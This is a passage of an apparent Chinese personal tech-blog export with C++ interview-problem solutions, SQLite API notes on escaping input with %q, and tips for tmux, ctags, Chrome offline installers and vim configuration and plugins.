title="题目"></a>题目</h2><p>给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。<br>保证base和exponent不同时为0</p><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><ul><li>简单快速幂算法</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">Power</span><span class="params">(<span class="keyword">double</span> base, <span class="keyword">int</span> exponent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp = <span class="built_in">abs</span>(exponent);</span><br><span class="line">        <span class="keyword">double</span> r = <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">while</span> (tmp) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp &amp; (<span class="keyword">unsigned</span>) <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">//对应位是1时，乘以base</span></span><br><span class="line">                r *= base;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//tmp移位，base要平方</span></span><br><span class="line">            base *= base;</span><br><span class="line">            tmp &gt;&gt;= (<span class="keyword">unsigned</span>) <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> exponent &lt; <span class="number">0</span> ? <span class="number">1</span> / r : r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="合并两个排序的列表"><a href="#合并两个排序的列表" class="headerlink" title="合并两个排序的列表"></a>合并两个排序的列表</h1><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p>输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。</p><h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><h3 id="非递归版本"><a href="#非递归版本" class="headerlink" title="非递归版本"></a>非递归版本</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> ListNode *<span class="title">Merge</span><span class="params">(ListNode *pHead1, ListNode *pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead1 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pHead2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* result = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (pHead1-&gt;val &lt; pHead2-&gt;val) &#123;</span><br><span class="line">            result = pHead1;</span><br><span class="line">            pHead1 = pHead1-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = pHead2;</span><br><span class="line">            pHead2 = pHead2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* pTmp = result;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pHead1 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                pTmp-&gt;next = pHead2;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pHead2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                pTmp-&gt;next = pHead1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pHead1-&gt;val &lt; pHead2-&gt;val) &#123;</span><br><span class="line">                pTmp-&gt;next = pHead1;</span><br><span class="line">                pHead1 = pHead1-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pTmp-&gt;next = pHead2;</span><br><span class="line">                pHead2 = pHead2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            pTmp = pTmp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="递归版本"><a href="#递归版本" class="headerlink" title="递归版本"></a>递归版本</h3><ul><li>合并链表选出较大的节点，下一跳时剩下两个链表再选</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> ListNode *<span class="title">Merge</span><span class="params">(ListNode *pHead1, ListNode *pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead1 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pHead2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* result = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (pHead1-&gt;val &lt; pHead2-&gt;val) &#123;</span><br><span class="line">            result = pHead1;</span><br><span class="line">            result-&gt;next = Merge(pHead1-&gt;next, pHead2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = pHead2;</span><br><span class="line">            result-&gt;next = Merge(pHead2-&gt;next, pHead1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="二叉树的镜像"><a href="#二叉树的镜像" class="headerlink" title="二叉树的镜像"></a>二叉树的镜像</h1><h2 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h2><p>操作给定的二叉树，将其变换为源二叉树的镜像。</p><p>输入描述:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二叉树的镜像定义：源二叉树 </span><br><span class="line">                    8</span><br><span class="line">                   &#x2F;  \</span><br><span class="line">                  6   10</span><br><span class="line">                 &#x2F; \  &#x2F; \</span><br><span class="line">                 5  7 9 11</span><br><span class="line">    	        镜像二叉树</span><br><span class="line">    	            8</span><br><span class="line">    	           &#x2F;  \</span><br><span class="line">    	          10   6</span><br><span class="line">    	         &#x2F; \  &#x2F; \</span><br><span class="line">    	        11 9 7  5</span><br></pre></td></tr></table></figure><h2 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h2><h3 id="递归版本-1"><a href="#递归版本-1" class="headerlink" title="递归版本"></a>递归版本</h3><ul><li>二叉树遍历，前序和后序都行，做操作即可</li><li>详见: <a href="/2018/09/18/2018-09-18-algorithmStudy/#towTree">二叉树遍历</a></li></ul><h3 id="非递归版本-1"><a href="#非递归版本-1" class="headerlink" title="非递归版本"></a>非递归版本</h3><ul><li>进行广度优先遍历或者深度优先遍历</li><li>弹出一个节点就交换其左右子树</li><li>详见: <a href="/2018/09/18/2018-09-18-algorithmStudy/#treeSpan">广度优先和深度优先遍历</a></li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>sqlite学习笔记(C语言)</title>
    <url>/2019/09/18/2019-09-18-sqlite/</url>
    <content><![CDATA[<h1 id="sqlite3"><a href="#sqlite3" class="headerlink" title="sqlite3"></a>sqlite3</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="sqlite3-snprintf"><a href="#sqlite3-snprintf" class="headerlink" title="sqlite3_snprintf"></a>sqlite3_snprintf</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sqlite3自带的防sql注入的snprintf</span></span><br><span class="line"><span class="comment"> * @param size 字符串最大大小</span></span><br><span class="line"><span class="comment"> * @param str 打印输出字符串</span></span><br><span class="line"><span class="comment"> * @param fmt 打印格式</span></span><br><span class="line"><span class="comment"> * @return 字符串首地址，创建成功；NULL，失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">SQLITE_API <span class="keyword">char</span> *<span class="title">sqlite3_snprintf</span><span class="params">(<span class="keyword">int</span> <span class="built_in">size</span>, <span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>sql注入会用单引号进行，使用<code>%q</code>代替<code>%s</code>输入字符串，会将单引号替换为两个单引号</li></ul><h3 id="sqlite3-exec"><a href="#sqlite3-exec" class="headerlink" title="sqlite3_exec"></a>sqlite3_exec</h3><ul><li>没有数据不会进入回调函数</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>软件使用技巧记录</title>
    <url>/2019/09/12/2019-09-12-softwareTips/</url>
    <content><![CDATA[<h1 id="source-insight"><a href="#source-insight" class="headerlink" title="source insight"></a>source insight</h1><h2 id="只添加特定后缀文件"><a href="#只添加特定后缀文件" class="headerlink" title="只添加特定后缀文件"></a>只添加特定后缀文件</h2><p>在<code>Add and remove project files</code>时，选中要添加的文件夹，在框内输入<code>*.xx</code>然后回车，再点击<code>Add Tree</code>即可。</p><h2 id="工程文件目录显示裁剪前面绝对路径"><a href="#工程文件目录显示裁剪前面绝对路径" class="headerlink" title="工程文件目录显示裁剪前面绝对路径"></a>工程文件目录显示裁剪前面绝对路径</h2><p>在<code>Project Setting</code>里面配置，<code>File Paths</code>-&gt;<code>Project Source Directory</code>下配置源文件路径。配好后就可以看到工程文件目录下文件的路径前面裁剪掉了配置的路径，只留下配置路径的子目录。</p><h1 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h1><h2 id="下载离线包"><a href="#下载离线包" class="headerlink" title="下载离线包"></a>下载离线包</h2><p>针对在内网环境下需要更新chrome需要下载离线包，官网下载为在线安装包，下载离线包的网址为，也就是在原本的网址上添加<code>?standalone=1</code></p><p><a href="https://www.google.cn/intl/zh-CN/chrome/?standalone=1" target="_blank" rel="noopener">https://www.google.cn/intl/zh-CN/chrome/?standalone=1</a></p><h1 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a><span id="tmux">tmux</span></h1><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ul><li>工具特定命令前缀为<code>Ctrl + b</code></li><li><code>&lt;方向键&gt;</code>: 切换到相应窗口</li><li><code>shift + &quot;</code>: 纵向分屏</li><li><code>shift + %</code>: 横向分屏</li><li><code>Ctrl + &lt;方向键&gt;</code>: 朝相应方向移动边界</li></ul><h1 id="ctags"><a href="#ctags" class="headerlink" title="ctags"></a><span id="ctags">ctags</span></h1><h2 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h2><h3 id="基本选项"><a href="#基本选项" class="headerlink" title="基本选项"></a>基本选项</h3><ul><li><code>-I xxx</code>: 许多函数定义最后有一个<code>__THROW</code>类似的，ctags将解析出错，加上此选项会忽略xxx</li><li><code>--fields=+iaS</code>:</li><li><code>--extra=+q</code></li><li><code>--c-kinds=+p</code></li></ul><h3 id="添加系统头文件支持"><a href="#添加系统头文件支持" class="headerlink" title="添加系统头文件支持"></a>添加系统头文件支持</h3><ul><li>执行以下命令生成系统头文件的tags</li><li>添加<code>set tags+=~/.vim/systags</code>包含系统头文件tags</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ctags -I __wur -I __THROW -I __THROWNL -I __attribute_pure__ -I __nonnull -I __attribute__ --file-scope=yes --langmap=c:+.h --languages=c,c++ --links=yes --c-kinds=+p --c++-kinds=+p --fields=+iaS --extra=+q -f ~/.vim/systags /usr/include/* /usr/include/c++/* /usr/include/linux/*</span><br></pre></td></tr></table></figure><h2 id="php支持"><a href="#php支持" class="headerlink" title="php支持"></a>php支持</h2><p>转载自 <a href="https://www.cnblogs.com/longdouhzt/archive/2013/04/15/3022908.html" target="_blank" rel="noopener">https://www.cnblogs.com/longdouhzt/archive/2013/04/15/3022908.html</a></p><ol><li>添加以下命令到<code>~/.bashrc</code>或者<code>~/.zshrc</code>等当前使用的bash的起始配置文件中，可以使用phptags来生成php的tags文件</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias phptags='ctags --langmap=php:.engine.inc.module.theme.php  --php-kinds=cdf  --languages=php'</span><br></pre></td></tr></table></figure><ol start="2"><li>添加以下配置到<code>~/.ctags</code>中，添加一些匹配规则</li></ol><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">--regex-php=/^[ \t]*[(private|public|static)( \t)]*<span class="function"><span class="keyword">function</span>[ \<span class="title">t</span>]+<span class="params">([A-Za-z0-9_]+)</span>[ \<span class="title">t</span>]*\<span class="params">(/\1/f, function, functions/</span></span></span><br><span class="line"><span class="function"><span class="params">--regex-php=/^[ \t]*[(private|public|static)</span>]+[ \<span class="title">t</span>]+\$<span class="params">([A-Za-z0-9_]+)</span>[ \<span class="title">t</span>]*/\1/<span class="title">p</span>, <span class="title">property</span>, <span class="title">properties</span>/</span></span><br><span class="line">--regex-php=/^[ \t]*(const)[ \t]+([A-Za-z0-<span class="number">9</span>_]+)[ \t]*/\<span class="number">2</span>/d, const, constants/</span><br></pre></td></tr></table></figure><ol start="3"><li>到工程目录下<code>phptags -R</code>即可生成相应tags</li></ol>]]></content>
      <categories>
        <category>Software Usage</category>
      </categories>
  </entry>
  <entry>
    <title>vi/vim命令学习</title>
    <url>/2019/09/10/2019-09-10-vim/</url>
    <content><![CDATA[<h1 id="常用配置"><a href="#常用配置" class="headerlink" title="常用配置"></a>常用配置</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ol><li><code>encoding</code>：VIM 使用的字符编码格式，包括 VIM 的 buffer (缓冲区)、菜单文本、消息文本等。可在~/.vimrc 中改变它的值，如果打开的文件编码与该属性配置的编码不同，那么VIM会将编码自动转换到这种编码然后再显示。</li><li><code>fileencoding</code>：VIM 当前编辑的文件的字符编码方式，VIM保存文件时也会将文件保存为这种字符编码方式 (不管是否新文件都如此)；如果它的值与encoding不一样，那么保存的时候VIM会自动把文件内容由encoding的编码转换为fileencoding配置编码再保存。而读取文件的时候，该选项的值会自动同步为fileencodings配置的有效编码。</li><li><code>fileencodings</code>：此项目配置的是一个编码列表，止Vim在读取文件的时候，会按照它所列出的字符编码方式逐一探测即将打开的文件的字符编码方式，并且将 fileencoding 设置为最终探测到的字符编码方式。因此最好将 Unicode 编码方式放到这个列表的最前面。</li><li><code>termencoding</code>：VIM 所工作的终端 (或者 Windows 的 Console 窗口) 的字符编码方式。这个选项在 Windows 下对我们常用的 GUI 模式的 gVim 无效，而对 Console 模式的 Vim 而言就是 Windows 控制台的代码页，并且通常我们不需要改变它。</li></ol><h2 id="读取和保存"><a href="#读取和保存" class="headerlink" title="读取和保存"></a>读取和保存</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> autoread        <span class="comment">" 外部改动自动读取</span></span><br><span class="line"><span class="keyword">set</span> autowriteall    <span class="comment">" 和autowrite类似，不过支持跳转命令保存</span></span><br></pre></td></tr></table></figure><h2 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h2><p>取消高亮</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">nohlsearch</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">noh</span></span><br></pre></td></tr></table></figure><h2 id="行号"><a href="#行号" class="headerlink" title="行号"></a>行号</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>     <span class="comment">" 显示行号</span></span><br><span class="line"><span class="keyword">set</span> nonumber   <span class="comment">" 取消显示行号</span></span><br></pre></td></tr></table></figure><h2 id="tab缩进"><a href="#tab缩进" class="headerlink" title="tab缩进"></a>tab缩进</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>           <span class="comment">" 4个空格识别成tab，读到的\t解释成4个空格</span></span><br><span class="line"><span class="keyword">set</span> softtabstop=<span class="number">4</span>       <span class="comment">" tab输入为4个空格宽度</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>        <span class="comment">" 换行时的自动缩进列数</span></span><br><span class="line"><span class="keyword">set</span> expandtab           <span class="comment">" 输入tab转成空格</span></span><br><span class="line"><span class="keyword">set</span> noexpandtab         <span class="comment">" 输入tab不转成空格</span></span><br><span class="line"><span class="keyword">set</span> autoindent          <span class="comment">" 自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent         <span class="comment">" 智能缩进</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="built_in">indent</span> <span class="keyword">on</span>      <span class="comment">" 不同文件使用不同缩进</span></span><br></pre></td></tr></table></figure><h2 id="状态栏"><a href="#状态栏" class="headerlink" title="状态栏"></a>状态栏</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>    <span class="comment">" 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> ruler           <span class="comment">" 显示鼠标所在行数在状态栏</span></span><br><span class="line"><span class="keyword">set</span> cursorline      <span class="comment">" 高亮光标所在行</span></span><br></pre></td></tr></table></figure><h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">syntax</span> <span class="keyword">on</span>           <span class="comment">" 代码高亮</span></span><br><span class="line"><span class="keyword">colorscheme</span> xxx     <span class="comment">" 配色方案采用xxx</span></span><br></pre></td></tr></table></figure><p>系统配色方案</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~|⇒ ls /usr/share/vim/vim74/colors</span><br><span class="line">blue.vim      delek.vim    evening.vim  murphy.vim     README.txt  slate.vim</span><br><span class="line">darkblue.vim  desert.vim   koehler.vim  pablo.vim      ron.vim     torte.vim</span><br><span class="line">default.vim   elflord.vim  morning.vim  peachpuff.vim  shine.vim   zellner.vim</span><br></pre></td></tr></table></figure><h3 id="添加配色方案"><a href="#添加配色方案" class="headerlink" title="添加配色方案"></a>添加配色方案</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xxx</span><br><span class="line">mv xxx/colors ~/.vim/colors</span><br></pre></td></tr></table></figure><ul><li>在vimrc里面添加<code>colorscheme xxx</code>即可</li></ul><h3 id="推荐配色方案"><a href="#推荐配色方案" class="headerlink" title="推荐配色方案"></a>推荐配色方案</h3><ul><li>molokai: <code>https://github.com/tomasr/molokai.git</code></li></ul><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> hlsearch    <span class="comment">" 高亮搜索结果</span></span><br><span class="line"><span class="keyword">set</span> incsearch   <span class="comment">" 输入字符串实时跳转到搜索结果</span></span><br><span class="line"><span class="keyword">set</span> ignorecase  <span class="comment">" 忽略大小写</span></span><br></pre></td></tr></table></figure><h2 id="折叠"><a href="#折叠" class="headerlink" title="折叠"></a>折叠</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> foldenable          <span class="comment">" 开启折叠</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">foldlevel</span>=<span class="number">999</span>       <span class="comment">" 设置折叠级别为999，也就是不自动折叠</span></span><br><span class="line"><span class="keyword">set</span> foldmethod=<span class="built_in">indent</span>   <span class="comment">" 使用按照缩进折叠的模式</span></span><br></pre></td></tr></table></figure><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><ul><li><code>i</code>: 进入编辑模式</li><li><code>esc</code>: 退出编辑模式</li><li><code>u</code>: 撤销</li><li><code>Ctrl + r</code>: 重做</li><li><code>shift + *</code>: 向下查找并高亮光标所在单词</li><li><code>shift + #</code>: 向上查找并高亮光标所在单词</li><li><code>g + b</code>: 从头查找并高亮光标所在单词</li><li><code>:noh</code>: 取消高亮</li><li><code>Ctrl + o</code>: 调回上次光标位置</li><li><code>Ctrl + i</code>: 跳到下一次光标位置</li><li><code>/xxx</code>: 当前文件搜索字符串</li><li><code>n</code>: 跳到下一个搜索位置</li><li><code>N</code>: 跳到上一个搜索位置</li><li><code>:xxx</code>: 跳转当前文件行号</li><li><code>:w</code>: 保存更改</li><li><code>:q</code>: 退出当前窗口</li><li><code>:q!</code>: 不保留更改退出当前窗口</li><li><code>:qa</code>: 退出所有窗口</li><li><code>ve</code>: 选择模式</li><li><code>gf</code>: 跳转到光标所在的文件</li></ul><h2 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h2><ul><li><code>vs</code>: 横向分屏</li><li><code>split</code>: 纵向分屏</li><li><code>Ctrl + w, (n), shift + &gt;</code>: 横向扩充窗口大小n，默认为1</li><li><code>Ctrl + w, (n), shift + &lt;</code>: 横向减少窗口大小n，默认为1</li><li><code>Ctrl + w, (n), shift + +</code>: 纵向扩充窗口大小n，默认为1</li><li><code>Ctrl + w, (n), shift + -</code>: 纵向减少窗口大小n，默认为1</li><li><code>Ctrl + w, h</code>: 跳转到左侧窗口</li><li><code>Ctrl + w, l</code>: 跳转到右侧窗口</li><li><code>Ctrl + w, j</code>: 跳转到上侧窗口</li><li><code>Ctrl + w, k</code>: 跳转到下侧窗口</li></ul><h2 id="全局搜索"><a href="#全局搜索" class="headerlink" title="全局搜索"></a>全局搜索</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vimgrep</span> /xxx/ ./xxx/xxx/*/*.*       <span class="comment">" 搜索xxx，在xxx/xxx/下的一级子目录所有文件</span></span><br><span class="line"><span class="keyword">vimgrep</span> /xxx/ ./xxx/xxx/**/*.*      <span class="comment">" 搜索xxx，在xxx/xxx/下的所有目录下的所有文件</span></span><br><span class="line"><span class="keyword">vimgrep</span> /xxx/<span class="keyword">j</span> ./xxx/xxx/**/*.*     <span class="comment">" 搜索xxx，在xxx/xxx/下的所有目录下的所有文件，j不跳转</span></span><br></pre></td></tr></table></figure><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li><code>:cn</code>: 跳转下一个定义</li><li><code>:cp</code>: 条状上一个定义</li><li><code>:copen</code>: 打开搜索结果</li></ul><h2 id="折叠-1"><a href="#折叠-1" class="headerlink" title="折叠"></a>折叠</h2><ul><li><code>z + c</code>: 折叠</li><li><code>z + o</code>: 不折叠</li></ul><h3 id="从m行到n行折叠"><a href="#从m行到n行折叠" class="headerlink" title="从m行到n行折叠"></a>从m行到n行折叠</h3><ul><li><code>:set foldmethod=manual</code>: 设置折叠方式为手工折叠</li><li><code>:(m),(n)fo</code>: m行到n行折叠</li></ul><h2 id="文件比对"><a href="#文件比对" class="headerlink" title="文件比对"></a>文件比对</h2><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">diffthis</span>    <span class="comment">" 当前文件加入对比</span></span><br></pre></td></tr></table></figure><h3 id="快捷键-1"><a href="#快捷键-1" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li><code>d + p</code>: 应用到另一个文件</li><li><code>d + o</code>: 应用到本文件</li></ul><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><h3 id="多行缩进"><a href="#多行缩进" class="headerlink" title="多行缩进"></a>多行缩进</h3><ol><li><code>ve</code>进入VISUAL状态</li><li>选中多行</li><li><code>(n), shift + &gt;</code>缩进n次，默认1；<code>(n), shift + &lt;</code>缩退n次，默认1</li></ol><h3 id="粘贴不乱缩进"><a href="#粘贴不乱缩进" class="headerlink" title="粘贴不乱缩进"></a>粘贴不乱缩进</h3><ol><li><code>:set paste</code>进入粘贴模式</li><li>粘贴将不会自动缩进</li><li><code>:set nopaste</code>退出粘贴模式</li></ol><h1 id="配置vimIde的各项插件"><a href="#配置vimIde的各项插件" class="headerlink" title="配置vimIde的各项插件"></a>配置vimIde的各项插件</h1><h2 id="插件安装统一方法"><a href="#插件安装统一方法" class="headerlink" title="插件安装统一方法"></a>插件安装统一方法</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xxx ~/.vim/bundle/xxx</span><br><span class="line">cd ~/.vim/bundle/xxx        # 到目录查看</span><br><span class="line">git tag                     # 查看版本号</span><br><span class="line">git checkout xxxx           # 切换到需要的版本</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>在<code>.vimrc</code>里面添加</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/xxx</span><br></pre></td></tr></table></figure><h2 id="文件树插件-NERDTree"><a href="#文件树插件-NERDTree" class="headerlink" title="文件树插件 NERDTree"></a>文件树插件 NERDTree</h2><p><a href="https://github.com/scrooloose/nerdtree.git" target="_blank" rel="noopener">https://github.com/scrooloose/nerdtree.git</a></p><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">" 设置打开文件树的快捷键为F10</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;F10&gt;</span> :NERDTreeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDTreeShowHidden</span>=<span class="number">1</span>      <span class="comment">" 显示隐藏文件</span></span><br></pre></td></tr></table></figure><h3 id="快捷键-2"><a href="#快捷键-2" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li><code>shift + c</code>: 切换当前目录为工作目录</li><li><code>cd</code>: 切换光标所在目录为vim所在路径</li><li><code>shift + i</code>: 显示和不显示隐藏文件</li><li><code>r</code>: 刷新光标所在目录</li><li><code>m</code>: 编辑当前目录</li><li><code>s</code>: 横向分屏打开文件</li><li><code>i</code>: 纵向分屏打开文件</li></ul><h2 id="C-C-格式化-clang-format"><a href="#C-C-格式化-clang-format" class="headerlink" title="C/C++格式化 clang-format"></a>C/C++格式化 clang-format</h2><p><a href="https://github.com/rhysd/vim-clang-format.git" target="_blank" rel="noopener">https://github.com/rhysd/vim-clang-format.git</a></p><h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">g:clang_format</span>#auto_format_on_insert_leave=<span class="number">1</span>  <span class="comment">" 在离开编辑模式时自动格式化</span></span><br></pre></td></tr></table></figure><h2 id="标签树-taglist"><a href="#标签树-taglist" class="headerlink" title="标签树 taglist"></a>标签树 taglist</h2><p><a href="https://github.com/vim-scripts/taglist.vim.git" target="_blank" rel="noopener">https://github.com/vim-scripts/taglist.vim.git</a></p><h3 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h3><ul><li>需要ctags的支持，自行安装</li><li>小技巧查看<a href="/2019/09/12/2019-09-12-softwareTips/#ctags">ctags</a></li></ul><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">" F9作为taglist的快捷键</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;F9&gt;</span> :TlistToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">let</span> Tlist_Exit_OnlyWindow=<span class="number">1</span>     <span class="comment">" 如果taglist是最后一个窗口，退出vim</span></span><br><span class="line"><span class="keyword">let</span> Tlist_Use_Right_Window=<span class="number">1</span>    <span class="comment">" taglist窗口在右侧</span></span><br></pre></td></tr></table></figure><h2 id="代码提示-tabnine"><a href="#代码提示-tabnine" class="headerlink" title="代码提示 tabnine"></a>代码提示 tabnine</h2><p><a href="https://github.com/zxqfl/tabnine-vim.git" target="_blank" rel="noopener">https://github.com/zxqfl/tabnine-vim.git</a></p><h2 id="多行注释插件-nerdcommenter"><a href="#多行注释插件-nerdcommenter" class="headerlink" title="多行注释插件 nerdcommenter"></a>多行注释插件 nerdcommenter</h2><p><a href="https://github.com/scrooloose/nerdcommenter.git" target="_blank" rel="noopener">https://github.com/scrooloose/nerdcommenter.git</a></p><h3 id="快捷键-3"><a href="#快捷键-3" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li><code>\cc</code>: 注释单行</li><li><code>\c&lt;space&gt;</code>: 取消注释</li></ul><h2 id="自动补全括号-auto-pairs"><a href="#自动补全括号-auto-pairs" class="headerlink" title="自动补全括号 auto-pairs"></a>自动补全括号 auto-pairs</h2><p><a href="https://github.com/jiangmiao/auto-pairs.git" target="_blank" rel="noopener">https://github.com/jiangmiao/auto-pairs.git</a></p><h2 id="nerdtree的git插件-nerdtree-git-plugin"><a href="#nerdtree的git插件-nerdtree-git-plugin" class="headerlink" title="nerdtree的git插件 